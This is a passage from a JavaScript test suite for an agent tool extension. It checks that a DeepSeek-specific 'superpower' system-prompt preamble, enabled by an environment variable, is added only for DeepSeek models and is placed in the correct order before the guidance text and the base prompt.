			if (previous === undefined) delete process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE;
			else process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE = previous;
		}
	});

	it("does not inject super power prompt for non-DeepSeek models", () => {
		const previous = process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE;
		process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE = "1";
		try {
			const { handlers } = createFakePi(["read"]);
			const beforeAgentStart = handlers.before_agent_start[0];
			const event = { systemPrompt: "base prompt", systemPromptOptions: { selectedTools: ["read"] } };
			const result = beforeAgentStart(event, { model: { provider: "openai-codex", id: "gpt-5.5" } });
			assert.equal(result, undefined, "should not modify non-DeepSeek prompts");
		} finally {
			if (previous === undefined) delete process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE;
			else process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE = previous;
		}
	});

	it("super power prompt appears at the top, followed by guidance, then system prompt", () => {
		const previous = process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE;
		process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE = "1";
		try {
			const { handlers } = createFakePi(["read", "bash", "serena_find_symbol"]);
			const beforeAgentStart = handlers.before_agent_start[0];
			const event = { systemPrompt: "base prompt", systemPromptOptions: { selectedTools: ["read", "bash", "serena_find_symbol"] } };
			const result = beforeAgentStart(event, { model: { provider: "opencode-go", id: "deepseek-v4-flash" } });
			assert.ok(result);
			const sys = result.systemPrompt;
			const spIdx = sys.indexOf("DEEPSEEK-V4-FLASH-SUPERPOWER");
			const guidanceIdx = sys.indexOf("OpenCode Go DeepSeek V4");
			const baseIdx = sys.indexOf("base prompt");
			assert.ok(spIdx >= 0, "should contain super power prompt");
			assert.ok(guidanceIdx >= 0, "should contain guidance");
			assert.ok(baseIdx >= 0, "should contain base prompt");
			assert.ok(spIdx < guidanceIdx, "super power should come before guidance");
			assert.ok(guidanceIdx < baseIdx, "guidance should come before base prompt");
		} finally {
			if (previous === undefined) delete process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE;
			else process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE = previous;
		}
	});
});

